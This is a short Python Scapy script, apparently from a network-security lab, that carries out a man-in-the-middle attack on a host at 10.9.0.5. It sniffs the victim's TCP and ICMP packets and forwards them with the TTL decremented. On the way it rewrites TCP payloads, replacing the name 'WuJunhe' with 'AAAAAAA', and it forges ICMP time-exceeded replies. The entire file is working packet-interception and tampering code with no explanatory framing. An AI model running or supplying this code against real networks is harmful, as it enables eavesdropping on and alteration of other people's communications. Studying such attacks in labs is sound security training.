#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def get_victim_mac(victim_ip):
    arp = ARP(pdst=victim_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(ether/arp, iface="eth0", timeout=2, verbose=0)[0]
    if result:
        mac = result[0][1].hwsrc
        return mac
    else:
        print("无法获得MAC地址")
        exit(1)
def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   newpkt.ttl -= 1
   if(newpkt.ttl <= 0):
        icmp_time_exceeded = IP(src="10.9.0.111", dst=pkt[IP].src) / ICMP(type=11, code=0) / IP(bytes(pkt[IP])[:28])
        send(icmp_time_exceeded, verbose=0)
        return
   del(newpkt.chksum)
   if pkt.haslayer(TCP):
        print("sniffed a tcp packet!")
        del(newpkt[TCP].chksum)
        if(pkt[TCP].payload):
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)
            data = pkt[TCP].payload.load
            print("*** %s, length: %d" % (data, len(data)))

            # Replace a pattern
            newdata = data.replace(b"WuJunhe", b"AAAAAAA")

            newpkt = newpkt/newdata
   elif pkt.haslayer(ICMP):
        print("sniffed a icmp packet")
        del(newpkt[ICMP].chksum)
   send(newpkt, verbose=0)

victim_mac = get_victim_mac("10.9.0.5")
f = f"(tcp or icmp) and ether src {victim_mac}"
pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt)

